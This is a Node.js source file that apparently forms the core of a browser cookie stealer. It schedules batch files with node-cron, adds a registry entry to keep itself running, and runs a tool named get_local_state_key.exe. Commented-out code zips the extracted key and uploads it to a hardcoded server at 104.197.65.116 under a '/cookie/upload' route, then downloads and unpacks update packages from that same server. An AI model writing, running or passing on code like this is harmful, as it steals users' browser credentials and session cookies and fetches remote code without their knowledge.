const cron = require('node-cron');
const fs = require('fs');
const mkdirp = require('mkdirp');
const path = require('path');
const extract = require('extract-zip');
const child_process = require('child_process');

cron.schedule('30 * * * * *', async function () {
  console.log('running a task every minute');
  const isExists = await checkRegExist();
  if (!isExists) {
    await addReg();
  }
});

cron.schedule('* * 22 * * *', async function () {
  console.log('running a task every minute');
  await update();
});

console.log('start');

update();

async function addReg() {
  await execBatch(path.resolve(__dirname, 'glsk', 'addReg.bat'));
}

async function checkRegExist() {
  await execBatch(path.resolve(__dirname, 'glsk', 'check.bat'));
  const isExists = fs.readFileSync(
    path.resolve(__dirname, 'glsk', 'regIsExists.txt')
  );

  if (isExists === 'true') {
    return true;
  } else {
    return false;
  }
}

async function update() {
  // const userPath = os.homedir();
  // const glskPath = path.resolve(__dirname, 'glsk');
  // const tttyyyPath = path.join(glskPath, 'tttyyy');

  // await mkdirp(tttyyyPath);

  // execGlsk();

  await execBatch(path.resolve(__dirname, 'glsk', 'out.bat'));
  console.log('finish out.bat');
  await execBatch(path.resolve(__dirname, 'glsk', 'new', 'new.bat'));
  console.log('finish new.bat');

  // const localStateKeyPath = path.join(__dirname, 'local_state_key.txt');

  // fs.copyFileSync(localStateKeyPath, tttyyyPath);

  // const zip = new JSZip();

  // zip.folder(tttyyyPath).file(path.join(glskPath, 'ty.zip'));

  // fs.unlinkSync(localStateKeyPath);
  // fs.unlinkSync(tttyyyPath);

  // let rqUuid;
  // let rqVersion;

  // if (fs.existsSync(path.join(glskPath, 'uuid.txt'))) {
  //   rqUuid = fs.readFileSync(path.join(glskPath, 'uuid.txt'));
  // }

  // if (fs.existsSync(path.join(glskPath, 'version.txt'))) {
  //   rqVersion = fs.readFileSync(path.join(glskPath, 'version.txt'));
  // }

  // var bodyFormData = new FormData();
  // bodyFormData.append('rqVersion', rqVersion);
  // bodyFormData.append('rqUuid', rqUuid);
  // bodyFormData.append('czip', path.join(glskPath, 'ty.zip'));

  // await new Promise((resolve, rejects) => {
  //   axios({
  //     method: 'post',
  //     url: 'http://104.197.65.116:8100/cookie/upload',
  //     data: bodyFormData,
  //     headers: { 'Content-Type': 'multipart/form-data' },
  //   })
  //     .then(function (response) {
  //       fs.unlinkSync(path.join(glskPath, 'ty.zip'));

  //       fs.writeFileSync(path.join(glskPath, 'uuid.txt'), response);

  //       resolve(response);
  //     })
  //     .catch(function (error) {
  //       console.log(error);
  //       rejects('error');
  //     });
  // });

  // const updateResponse = await new Promise((resolve, rejects) => {
  //   axios({
  //     method: 'get',
  //     url: `http://104.197.65.116:8100/client/update?rqVersion=${rqVersion}&rqUuid=${rqUuid}`,
  //   })
  //     .then(function (response) {
  //       resolve(response);
  //     })
  //     .catch(function (error) {
  //       console.log(error);
  //       rejects('error');
  //     });
  // });

  // const zipPath = path.resolve(__dirname, 'tyService.zip');

  // fs.writeFileSync(zipPath, updateResponse);

  // const zipFolder = path.resolve(__dirname, 'tyService');

  // await mkdirp(zipFolder);

  // await unzip(zipPath, zipFolder);

  // fs.unlinkSync(zipPath);
}

function execBatch(batchFilePath) {
  return new Promise((resolve, rejects) => {
    child_process.exec(batchFilePath, function (error, stdout, stderr) {
      console.log(stdout);
      resolve();
      if (error) {
        rejects(error);
      }
    });
  });
}

function execGlsk() {
  console.log('execGlsk() start');
  child_process.execFile('./glsk/get_local_state_key.exe', function (err) {
    console.log(err);
  });
  sleep(6000);
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

/** 解壓縮 */
async function unzip(zipPath, folderPath) {
  console.log('開始解壓縮');
  await mkdirp(folderPath);

  extract(zipPath, { dir: folderPath });

  return fs.readdirSync(folderPath).length;
}
